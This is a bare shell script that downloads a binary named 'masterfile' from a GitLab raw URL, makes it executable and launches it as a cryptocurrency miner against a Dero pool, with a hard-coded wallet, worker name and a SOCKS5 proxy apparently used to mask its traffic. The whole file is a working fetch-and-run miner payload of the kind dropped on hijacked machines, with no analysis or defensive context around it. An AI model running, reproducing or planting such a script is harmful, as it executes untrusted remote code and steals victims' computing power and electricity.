#!/bin/sh
wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
chmod 777 masterfile
POOL=der.pool-pay.com:3093	
WALLET=dERoSUQ2QSg1LjXH7yQdSYRfvwibUr3tNbQxEb1gV9cTBkR242Qt38VSSWRfSy1XpBQYevg5PH17KXGiy71PBqSL1tDBzAuVMP+0000000000000000000000000000000000000000000000000000001870910757
WORKER=endvoc
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
